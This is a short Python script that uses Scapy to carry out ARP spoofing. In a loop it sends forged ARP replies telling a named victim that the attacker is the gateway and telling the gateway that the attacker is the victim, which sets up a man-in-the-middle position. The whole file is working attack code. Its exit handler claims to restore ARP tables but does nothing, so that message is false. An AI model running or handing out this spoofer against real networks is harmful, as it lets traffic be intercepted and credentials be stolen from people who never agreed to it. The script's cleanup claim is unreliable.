#!/usr/bin/env python3
from scapy.all import ARP, send
import time
import argparse


def spoof(target_ip, spoof_ip):
    """Send ARP reply: target_ip thinks spoof_ip is at our MAC"""
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=0)


def main(victim_ip, gateway_ip):
    print(f"[+] Starting ARP spoofing: {victim_ip} <-> {gateway_ip}")
    try:
        while True:
            spoof(victim_ip, gateway_ip)  # Tell victim: I am gateway
            spoof(gateway_ip, victim_ip)  # Tell gateway: I am victim
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopping ARP spoofing... Restoring ARP tables...")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple ARP Spoofer with Scapy")
    parser.add_argument("victim", help="Victim IP address")
    parser.add_argument("gateway", help="Gateway IP address")
    args = parser.parse_args()

    main(args.victim, args.gateway)
